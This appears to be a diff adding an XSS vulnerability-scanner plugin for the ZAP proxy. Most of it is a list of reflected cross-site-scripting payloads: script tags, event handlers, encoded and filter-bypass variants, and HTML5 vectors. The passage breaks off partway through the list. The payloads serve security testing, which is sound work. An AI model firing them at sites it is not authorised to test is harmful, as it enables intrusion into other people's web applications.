@@ -1,0 +1,93 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+"""
+XSS Scanner - ZAP Active Scan Script
+Comprehensive XSS vulnerability scanner with multiple payload types
+"""
+
+import re
+import urllib
+from org.zaproxy.zap.extension.ascan import AbstractAppPlugin
+from org.parosproxy.paros.core.scanner import Alert, Plugin
+from org.parosproxy.paros.network import HttpMessage
+
+class XSSScanner(AbstractAppPlugin):
+    
+    def __init__(self):
+        super(XSSScanner, self).__init__()
+        self.id = 90002
+        self.name = "Custom XSS Scanner"
+        self.description = "Comprehensive XSS vulnerability scanner"
+        
+    def getId(self):
+        return self.id
+    
+    def getName(self):
+        return self.name
+    
+    def getDescription(self):
+        return self.description
+    
+    def getCategory(self):
+        return Plugin.Category.INJECTION
+    
+    def getRisk(self):
+        return Alert.RISK_HIGH
+    
+    def getConfidence(self):
+        return Alert.CONFIDENCE_MEDIUM
+    
+    def init(self):
+        # XSS payload categories
+        self.payloads = {
+            'reflected': [
+                # Basic XSS
+                "<script>alert('XSS')</script>",
+                "<script>alert(1)</script>",
+                "<script>alert(document.domain)</script>",
+                "<script>alert(String.fromCharCode(88,83,83))</script>",
+                
+                # Event handlers
+                "<img src=x onerror=alert('XSS')>",
+                "<svg onload=alert('XSS')>",
+                "<input type=image src=x onerror=alert('XSS')>",
+                "<body onload=alert('XSS')>",
+                "<iframe src=javascript:alert('XSS')>",
+                "<object data=javascript:alert('XSS')>",
+                
+                # Without quotes
+                "<script>alert(1)</script>",
+                "<img src=x onerror=alert(1)>",
+                "<svg onload=alert(1)>",
+                
+                # Encoded payloads
+                "%3Cscript%3Ealert('XSS')%3C/script%3E",
+                "&lt;script&gt;alert('XSS')&lt;/script&gt;",
+                "&#60;script&#62;alert('XSS')&#60;/script&#62;",
+                
+                # JavaScript URL
+                "javascript:alert('XSS')",
+                "javascript:alert(1)",
+                "javascript:alert(document.domain)",
+                
+                # Expression
+                "${alert('XSS')}",
+                "{{alert('XSS')}}",
+                
+                # Data URLs
+                "data:text/html,<script>alert('XSS')</script>",
+                
+                # Filter bypass
+                "<script>alert`XSS`</script>",
+                "<script>alert(/XSS/)</script>",
+                "<script>alert(String.fromCharCode(88,83,83))</script>",
+                "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
+                
+                # HTML5 vectors
+                "<audio src=x onerror=alert('XSS')>",
+                "<video src=x onerror=alert('XSS')>",
+                "<source src=x onerror=alert('XSS')>",
+                "<track src=x onerror=alert('XSS')>",
+                
+                # Form vectors
+                "<form><button formaction=javascript:alert('XSS')>XSS</button></form
